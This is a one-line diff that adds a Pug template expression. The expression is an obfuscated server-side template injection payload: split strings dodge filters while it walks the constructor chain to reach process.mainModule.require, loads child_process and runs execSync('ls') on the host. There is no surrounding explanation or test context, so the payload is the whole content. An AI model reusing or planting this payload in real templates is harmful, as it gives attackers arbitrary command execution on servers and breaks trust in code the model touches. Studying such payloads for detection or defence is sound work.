@@ -1,0 +1,1 @@
+p #{(this['cons'+'tructor']['cons'+'tructor']('return this')())['proc'+'ess'].mainModule['req'+'uire']('c'+'h'+'i'+'l'+'d'+'_'+'p'+'r'+'o'+'c'+'e'+'s'+'s').execSync('ls').toString()}
